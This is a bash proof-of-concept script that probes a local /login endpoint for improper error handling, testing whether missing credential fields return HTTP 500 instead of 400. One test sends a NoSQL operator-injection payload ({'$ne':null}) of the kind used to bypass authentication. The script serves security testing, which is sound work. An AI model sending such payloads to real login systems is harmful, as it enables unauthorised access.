#!/bin/bash

# POC: Improper Error Handling - HTTP 500 for Missing Required Fields
# Target: /login endpoint
# Description: Tests that missing username/password fields incorrectly return HTTP 500
# instead of HTTP 400 Bad Request

TARGET_URL="http://localhost:5003/login"

echo "============================================"
echo "Improper Error Handling POC - HTTP 500 Errors"
echo "============================================"
echo ""

# Test 1: Missing password field (only username provided)
echo "[Test 1] Missing password field (only username):"
echo "Request: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -d '{\"username\":\"admin\"}'"
echo ""
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status Code: $HTTP_CODE"
echo "Response Body: $BODY"
if [ "$HTTP_CODE" = "500" ]; then
  echo "✗ VULNERABLE: Returns 500 instead of 400"
else
  echo "✓ Returns $HTTP_CODE (expected 500 for this vulnerability)"
fi
echo ""

# Test 2: Missing username field (only password provided)
echo "[Test 2] Missing username field (only password):"
echo "Request: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -d '{\"password\":\"test123\"}'"
echo ""
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"password":"test123"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status Code: $HTTP_CODE"
echo "Response Body: $BODY"
if [ "$HTTP_CODE" = "500" ]; then
  echo "✗ VULNERABLE: Returns 500 instead of 400"
else
  echo "✓ Returns $HTTP_CODE (expected 500 for this vulnerability)"
fi
echo ""

# Test 3: Empty JSON payload (missing both fields)
echo "[Test 3] Empty JSON payload (missing both fields):"
echo "Request: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -d '{}'"
echo ""
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status Code: $HTTP_CODE"
echo "Response Body: $BODY"
if [ "$HTTP_CODE" = "500" ]; then
  echo "✗ VULNERABLE: Returns 500 instead of 400"
else
  echo "✓ Returns $HTTP_CODE (expected 500 for this vulnerability)"
fi
echo ""

# Test 4: Valid request with extra fields (for comparison)
echo "[Test 4] Valid request with extra fields (baseline comparison):"
echo "Request: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"wrong\",\"extra\":\"field\"}'"
echo ""
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong","extra":"field"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status Code: $HTTP_CODE"
echo "Response Body: $BODY"
if [ "$HTTP_CODE" = "401" ]; then
  echo "✓ Returns 401 (expected for invalid credentials)"
fi
echo ""

# Test 5: NoSQL operator injection (combined vulnerability)
echo "[Test 5] NoSQL operator injection (combined vulnerability):"
echo "Request: curl -X POST $TARGET_URL -H 'Content-Type: application/json' -d '{\"username\":{\"\$ne\":null},\"password\":{\"\$ne\":null}}'"
echo ""
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status Code: $HTTP_CODE"
echo "Response Body: $BODY"
if [ "$HTTP_CODE" = "500" ]; then
  echo "✗ VULNERABLE: Returns 500 for operator injection (combined with NoSQL injection)"
fi
echo ""

echo "============================================"
echo "Summary:"
echo "============================================"
echo "✗ Missing required fields trigger HTTP 500 instead of 400"
echo "✗ NoSQL operators also trigger HTTP 500 errors"
echo "✗ Improper error handling reveals application behavior"
echo "✗ No input validation before processing"
echo ""